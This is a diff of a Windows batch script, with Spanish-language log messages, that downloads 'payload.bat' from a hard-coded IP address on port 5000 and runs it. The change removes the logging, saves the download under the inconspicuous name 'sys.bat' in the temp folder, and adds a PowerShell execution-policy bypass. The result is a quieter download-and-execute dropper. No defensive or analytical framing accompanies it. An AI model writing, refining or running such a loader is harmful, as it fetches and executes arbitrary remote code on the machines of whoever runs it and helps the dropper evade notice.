@@ -1,22 +1,8 @@
 @echo off
-setlocal
+set URL=http://82.29.153.101:5000/payload.bat
+set FILE=%temp%\sys.bat
 
-set BASE=http://82.29.153.101:5000
-set FILE=%temp%\payload.bat
-set LOG=%temp%\client.log
-
-echo [INFO] Descargando payload... > "%LOG%"
-
-powershell -NoP -Command ^
-"(Invoke-WebRequest '%BASE%/payload.bat' -UseBasicParsing).Content | Out-File -Encoding ASCII '%FILE%'"
-
-if not exist "%FILE%" (
-    echo [ERROR] No se pudo descargar >> "%LOG%"
-    exit /b
-)
-
-echo [INFO] Ejecutando... >> "%LOG%"
+powershell -NoP -ExecutionPolicy Bypass -Command ^
+"$r = Invoke-WebRequest '%URL%' -UseBasicParsing; $r.Content | Set-Content -Encoding ASCII '%FILE%'"
 
 call "%FILE%"
-
-echo [OK] Ejecutado >> "%LOG%"
